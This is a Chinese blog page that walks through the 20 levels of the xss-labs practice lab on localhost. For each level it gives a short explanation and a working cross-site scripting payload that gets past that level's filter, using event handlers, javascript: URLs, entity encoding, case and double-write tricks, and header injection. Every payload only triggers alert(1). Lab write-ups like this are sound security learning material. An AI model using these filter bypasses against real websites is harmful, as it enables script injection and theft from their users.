@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>xss-labs 通关笔记 | YEYEYETO</title>
+
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="Level 112反射http:&#x2F;&#x2F;localhost&#x2F;xss-labs&#x2F;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  Level 212input标签闭合&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  Level 3123456789htmlspecialchars()：把预定义的字">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-labs 通关笔记">
+<meta property="og:url" content="https://yeyeyeyeto.github.io/%E5%AE%89%E5%85%A8/2024-06-16-security/xss-labs.html">
+<meta property="og:site_name" content="YEYEYETO">
+<meta property="og:description" content="Level 112反射http:&#x2F;&#x2F;localhost&#x2F;xss-labs&#x2F;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  Level 212input标签闭合&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  Level 3123456789htmlspecialchars()：把预定义的字">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yeyeyeyeto.github.io/images/20230711162700.png">
+<meta property="article:published_time" content="2024-06-15T19:35:01.000Z">
+<meta property="article:modified_time" content="2024-06-15T12:37:37.653Z">
+<meta property="article:author" content="Eternal">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yeyeyeyeto.github.io/images/20230711162700.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="/css/highlight/highlight.css" media="none" >
+        
+            <link rel="stylesheet" id="hl-dark-theme" href="/css/highlight/highlight.dark.css" media="none">
+        
+    
+
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/style/dark.css">
+
+    
+<script src="/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">YEYEYEYETO</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/categories/" class="navbar-menu button">分类</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/categories/" class="dropdown-menu button">分类</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        xss-labs 通关笔记
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2024/06/" class="post-meta__date button">2024-06-15</a>
+        
+    <span class="separate-dot"></span><a href="/categories/%E5%AE%89%E5%85%A8/" class="button">安全</a>
+
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1"><span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2"><span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-3"><span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-4"><span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-5"><span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-6"><span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-7"><span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-8"><span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-9"><span class="toc-text">Level 9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-10"><span class="toc-text">Level 10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-11"><span class="toc-text">Level 11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-12"><span class="toc-text">Level 12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-13"><span class="toc-text">Level 13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-14"><span class="toc-text">Level 14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-15"><span class="toc-text">Level 15</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-16"><span class="toc-text">Level 16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-17"><span class="toc-text">Level 17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-18"><span class="toc-text">Level 18</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-19"><span class="toc-text">Level 19</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-20"><span class="toc-text">Level 20</span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">文章目录</div>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1"><span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2"><span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-3"><span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-4"><span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-5"><span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-6"><span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-7"><span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-8"><span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-9"><span class="toc-text">Level 9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-10"><span class="toc-text">Level 10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-11"><span class="toc-text">Level 11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-12"><span class="toc-text">Level 12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-13"><span class="toc-text">Level 13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-14"><span class="toc-text">Level 14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-15"><span class="toc-text">Level 15</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-16"><span class="toc-text">Level 16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-17"><span class="toc-text">Level 17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-18"><span class="toc-text">Level 18</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-19"><span class="toc-text">Level 19</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-20"><span class="toc-text">Level 20</span></a></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反射</span><br><span class="line">http://localhost/xss-labs/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input标签闭合</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars()：把预定义的字符转换为 HTML 实体。</span><br><span class="line">&amp; （和号）成为 &amp;amp; </span><br><span class="line">&quot; （双引号）成为 &amp;quot; </span><br><span class="line">&#x27; （单引号）成为 &#x27; </span><br><span class="line">&lt; （小于）成为 &amp;lt; </span><br><span class="line">&gt; （大于）成为 &amp;gt;</span><br><span class="line"></span><br><span class="line">单引号不转义，输入后点击一次输入框触发</span><br><span class="line">&#x27;onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">相比于上一关增加了对尖括号的过滤</span><br><span class="line">&quot;onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤了on和&lt;script</span><br><span class="line">javascript:alert(1) 使用了java伪协议：就是把javascript::后面的代码当JavaScript来执行</span><br><span class="line">&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">过滤更多元素，可以混合大小写绕过</span><br><span class="line">&quot;&gt;&lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot;&gt;&lt;iframe sRc=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">强制转小写，但过滤不严谨，可以双写绕过</span><br><span class="line">&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/sscriptcript&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">黑名单过滤严格，但可以使用HTML实体来绕过过滤</span><br><span class="line">javascript:alert(1)</span><br><span class="line"></span><br><span class="line">使用网站转换后得下边一串	</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;	</span><br><span class="line"></span><br><span class="line">[HTML字符实体化转换](https://www.qqxiuzi.cn/bianma/zifushiti.php)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">经典白名单，看源码发现必须含有http://；在上一关基础上加上</span><br><span class="line">	&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这一关必须看浏览器代码，输入框被hidden，我们修改为text让其可以输入</span><br><span class="line">?t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br><span class="line">再在name为t_sort的标签内添加以下参数</span><br><span class="line">onmousemove=&quot;alert(1)&quot;</span><br><span class="line">可以利用其他标签额外闭合</span><br><span class="line">&quot;&quot; onmousemove=&quot;alert(1)&quot; &quot;=&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用BP Repeater中Request添加referer</span><br><span class="line">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)</span><br><span class="line">右键Request界面Request in browser - in original session</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同上，但User-Agent头</span><br><span class="line">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同上，但Cookie头；要在本来的参数后面加上</span><br><span class="line">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h4><p>这题本来是利用转跳到的网站，在那网站去上传一个，属性里面含有xss代码的图片，以达到弹窗的效果，但由于网站挂了，无法实验。<br>需要隐写Exif隐藏信息。EXIF：可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。可使用鼠标右键进入属性页面查看部分信息。<br>我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。我们可以在这些属性里面添加XSS代码，然后上传图片实现弹窗。大致如下图</p>
+<p><img src="/images/20230711162700.png" class="lazy" data-srcset="/images/20230711162700.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAABlBMVEXMzMyWlpYU2uzLAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAACklEQVQImWNgAAAAAgAB9HFkpgAAAABJRU5ErkJggg=="></p>
+<h4 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h4><p><a target="_blank" rel="noopener" href="https://www.runoob.com/angularjs/ng-ng-include.html">文件包含 ng-include</a><br>ng-include指令：包含的内容将作为指定元素的子节点。<br>默认情况下，包含的文件需要包含在同一个域名下。<br>我们包含第一关的漏洞即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level15.php?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格过滤</span><br><span class="line">“0D”是把光标移到同一行的顶头——回车(CR)。</span><br><span class="line">“0A”是把光标移到下一行——换行(LF)。</span><br><span class="line">使用替身，就是将%0a或者%0D当成空格使用，在HTML中这样是合法的。</span><br><span class="line">http://127.0.0.1/xss-labs/level16.php?keyword=&lt;img%0dsrc=1%0donerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">embed标签绕过</span><br><span class="line">&lt;embed&gt;标签，是用来嵌入图片的。可以用onclick或onmouseover绕过。因为这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。</span><br><span class="line">http://127.0.0.1/xss-labs/level17.php?arg01=a&amp;arg02=aaa onmousemove=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">拼接绕过</span><br><span class="line">同上</span><br><span class="line">http://127.0.0.1/xss-labs/level18.php?arg01=a&amp;arg02=aaa onmousemove=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这关是flash xss，涉及到反编译，能力有限，直接上逆向后的payload</span><br><span class="line">有人可能会问为啥这里不能用前面两关的方法了？因为源码把上面漏洞闭合了,加了一对双引号，绕不出去了（作者故意的）</span><br><span class="line">arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-20"><a href="#Level-20" class="headerlink" title="Level 20"></a>Level 20</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=id&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)</span><br></pre></td></tr></table></figure>
+<hr>
+
+    </div>
+     
+    <div class="post-footer__meta"><p>更新于 2024-06-15</p></div> 
+    <div class="post-entry__tags"></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+                <a href="/%E5%AE%89%E5%85%A8/2024-06-16-security/upload-labs.html" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            上一篇
+                        </div>
+                        <div class="nav__title">
+                            upload-labs 通关笔记
+                        </div>
+                    </div>
+                </a>
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/%E5%B7%A5%E5%85%B7/2024-06-16-tools/ffmpeg%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            下一篇
+                        </div>
+                        <div class="nav__title">
+                            ffmpeg 常用命令
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="回到顶部" title="回到顶部">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2024 <a href="/">YEYEYETO</a>
+        </p>
+    
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+        </div>
+        
+    <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+    <script>
+        window.lazyLoadOptions = {
+            elements_selector: ".lazy",
+            threshold: 0
+        };
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('true'),
+            auto_fancybox = Boolean('false')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+
+    </body>
+</html>
